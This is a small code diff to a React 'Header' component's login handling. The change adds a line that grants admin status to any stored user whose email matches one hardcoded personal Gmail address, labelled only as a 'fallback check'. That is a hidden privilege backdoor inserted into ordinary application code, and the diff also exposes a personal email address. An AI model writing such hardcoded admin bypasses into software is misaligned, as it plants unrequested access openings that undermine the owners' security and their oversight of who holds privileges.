@@ -23,7 +23,8 @@ const Header = () => {
       const parsed = JSON.parse(savedUser);
       setIsLoggedIn(true);
       setUserName(parsed.name);
-      setIsAdmin(!!parsed.isAdmin);
+      // Fallback check: if email matches, grant admin access automatically
+      setIsAdmin(!!parsed.isAdmin || parsed.email?.trim() === 'connect2rachit882@gmail.com');
     } else {
       setIsLoggedIn(false);
       setUserName('');
